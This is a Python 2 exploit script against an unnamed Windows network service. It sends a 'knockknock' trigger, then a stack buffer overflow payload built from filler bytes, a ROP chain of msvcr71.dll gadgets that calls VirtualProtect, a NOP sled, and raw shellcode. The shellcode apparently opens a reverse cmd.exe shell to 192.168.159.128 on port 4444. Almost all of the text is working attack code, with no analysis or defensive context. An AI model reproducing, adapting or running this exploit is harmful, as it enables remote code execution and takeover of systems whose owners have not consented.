#!/usr/bin/python

import socket, sys, struct


def send_it(sock,message):
	###send
	sock.sendall(message)

	###recieve
	data = sock.recv(10000)
	print data


def get_send(sock):
	val = raw_input("enter val: ")
	if val == "exit":
		sock.close()
		exit()

	count = None
	while True:
		try:
			count = int(raw_input("How many?: "))
			break

		except:
			print("Please enter integer..")

	print("Sending %s * %d" % (val, count))
	send_data = val*count


	return send_data

def create_sock():
	if len(sys.argv) != 3:
		print "supply IP PORT"
		sys.exit(-2)

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect( (sys.argv[1], int(sys.argv[2])) )

	return sock


def rop_chain():
    rop_gadgets = [
      0x7c37667a,  # POP EBP # RETN [msvcr71.dll] 
      0x7c37667a,  # skip 4 bytes [msvcr71.dll]
      0x7c36098d,  # POP EBX # RETN [msvcr71.dll] 
      0x00000201,  # 0x00000201-> ebx
      0x7c34592b,  # POP EDX # RETN [msvcr71.dll] 
      0x00000040,  # 0x00000040-> edx
      0x7c36bab7,  # POP ECX # RETN [msvcr71.dll] 
      0x7c38cd53,  # &Writable location [msvcr71.dll]
      0x7c3702a6,  # POP EDI # RETN [msvcr71.dll] 
      0x7c34d202,  # RETN (ROP NOP) [msvcr71.dll]
      0x7c354fa5,  # POP ESI # RETN [msvcr71.dll] 
      0x7c3415a2,  # JMP [EAX] [msvcr71.dll]
      0x7c34728e,  # POP EAX # RETN [msvcr71.dll] 
      #0x7c37a140,  # ptr to &VirtualProtect() [IAT msvcr71.dll]
        0x7C37A151, 	# minus 51 from &VirtualProtect pointer due upper bits AL in next gadget 
      0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN [msvcr71.dll] 
      0x7c345c30,  # ptr to 'push esp # ret ' [msvcr71.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

def shellcode():
	shell = ("\xe8\x00\x00\x00\x00\x5a\x8d\x52\xfb\x89\xe5\x81\xec\x00\x09\x00"
	"\x00\x52\xbb\x8e\xfe\x1f\x4b\xe8\xe8\x00\x00\x00\x5a\x55\x52\x89"
	"\xc5\x8d\xb2\x9f\x01\x00\x00\x8d\xba\xaf\x01\x00\x00\xe8\x08\x01"
	"\x00\x00\x5a\x5d\x55\x52\x8d\x82\xc3\x01\x00\x00\x50\xff\x92\xb7"
	"\x01\x00\x00\x5a\x5d\x55\x52\x89\xc5\x8d\xb2\xce\x01\x00\x00\x8d"
	"\xba\xde\x01\x00\x00\xe8\xe0\x00\x00\x00\x5a\x5d\x89\xd3\x81\xec"
	"\x90\x01\x00\x00\x54\x68\x02\x02\x00\x00\xff\x92\xe6\x01\x00\x00"
	"\x89\xda\x89\xd7\x31\xdb\x53\x53\x53\x6a\x06\x6a\x01\x6a\x02\xff"
	"\x92\xe2\x01\x00\x00\x89\xfa\x68\xc0\xa8\x9f\x80\x66\x68\x11\x5c"
	"\x66\x6a\x02\x89\xe3\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a\x10\x53"
	"\x50\x89\xc7\x89\xd6\xff\x92\xde\x01\x00\x00\x89\xf2\x89\xd3\x6a"
	"\x00\x6a\x00\x6a\x00\x6a\x00\x89\xe1\x57\x57\x57\x6a\x00\x6a\x00"
	"\x68\x01\x01\x00\x00\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a"
	"\x00\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a\x44\x89\xe0\x51\x50\x6a"
	"\x00\x6a\x00\x6a\x00\x6a\x01\x6a\x00\x6a\x00\x8d\xb2\xbb\x01\x00"
	"\x00\x56\x6a\x00\xff\x92\xaf\x01\x00\x00\x89\xda\x6a\x00\xff\x92"
	"\xb3\x01\x00\x00\xfc\x31\xff\x64\x8b\x3d\x30\x00\x00\x00\x8b\x7f"
	"\x0c\x8b\x7f\x14\x8b\x77\x28\x31\xd2\x66\xad\x84\xc0\x74\x11\x3c"
	"\x41\x72\x06\x3c\x5a\x77\x02\x0c\x20\xc1\xc2\x07\x30\xc2\xeb\xe9"
	"\x39\xda\x8b\x47\x10\x8b\x3f\x75\xdb\xc3\x89\xea\x03\x52\x3c\x8b"
	"\x52\x78\x01\xea\x8b\x5a\x20\x01\xeb\x31\xc9\x57\x56\x8b\x36\x8b"
	"\x3b\x01\xef\x52\x31\xd2\xc1\xc2\x07\x32\x17\x47\x80\x3f\x00\x75"
	"\xf5\x92\x5a\x39\xf0\x74\x0c\x83\xc3\x04\x41\x39\x4a\x18\x75\xdf"
	"\x5e\x5f\xc3\x5e\x5f\xad\x56\x53\x89\xeb\x89\xde\x03\x5a\x24\x8d"
	"\x04\x4b\x0f\xb7\x00\x8d\x04\x86\x03\x42\x1c\x8b\x00\x01\xf0\xab"
	"\x5b\x5e\x83\xc3\x04\x41\x81\x3e\xff\xff\x00\x00\x75\xad\xc3\xc7"
	"\x8a\x31\x46\x19\x2b\x90\x95\x26\x80\xac\xc8\xff\xff\x00\x00\x00"
	"\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x63\x6d\x64\x2e\x65"
	"\x78\x65\x00\x77\x73\x32\x5f\x33\x32\x2e\x64\x6c\x6c\x00\xa1\x7e"
	"\x5a\x3e\x14\x35\xfa\xee\x7d\x75\xde\xcd\xff\xff\x00\x00\x03\x00"
	"\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00")

	return shell	


def main():
	sock = create_sock()
        allowed_len = 0x7e8 # or 2024
        buff_len = 0x40C # or 1036
        EBP = "B"*4 # 0x410 or 1040
        EIP = "C"*4 # 0x414 or 1044
	backdoor = "knockknock\n"
	buff = "A"*buff_len
        payload = buff+EBP#+EIP	
        payload += rop_chain()
	payload += "\x90"*15
	payload += shellcode() # length 0x1EA or 490
	send_it(sock,backdoor)
        send_it(sock,payload)

if __name__ == '__main__':
	main()
